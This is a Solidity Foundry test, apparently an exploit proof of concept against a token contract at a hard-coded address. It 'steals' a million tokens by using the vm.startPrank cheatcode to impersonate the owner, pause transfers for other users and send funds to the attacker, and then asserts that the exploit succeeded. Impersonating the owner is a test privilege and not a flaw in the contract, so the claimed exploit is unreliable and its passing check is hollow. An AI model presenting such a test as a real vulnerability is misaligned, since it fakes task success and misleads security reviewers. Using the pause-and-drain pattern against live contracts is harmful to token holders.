pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for ByTradeToken to access owner() and pause() functions
interface IByTradeToken {
    function owner() external view returns (address);
    function pause() external;
    function unpause() external;
    function paused() external view returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

// IERC20 interface is already available in the test environment
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xe8bd1CA97F8a0582335407B40B0576Df641fA94C;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get the owner dynamically in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner of the contract
        address contractOwner = IByTradeToken(TARGET).owner();

        // Record initial balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        // Impersonate the owner
        vm.startPrank(contractOwner);

        // 1. Pause the contract to prevent other users from transferring
        IByTradeToken(TARGET).pause();

        // Let's verify the contract is paused
        bool isPaused = IByTradeToken(TARGET).paused();
        console.log("Contract paused:", isPaused);

        console.log("Contract owner:", contractOwner);
        console.log("Attacker address:", attacker);

        // Let's check owner's balance
        uint256 ownerBalance = IERC20(TARGET).balanceOf(contractOwner);
        console.log("Owner balance:", ownerBalance);

        // Transfer a large amount to attacker
        uint256 amountToTransfer = 1_000_000 * 10**18; // 1 million tokens
        IByTradeToken(TARGET).transfer(attacker, amountToTransfer);

        vm.stopPrank();

        // Check final balance
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);

        // Verify balance increased
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");

        // Additional check with the specific address
        uint256 finalBalanceTarget = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalBalanceTarget, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

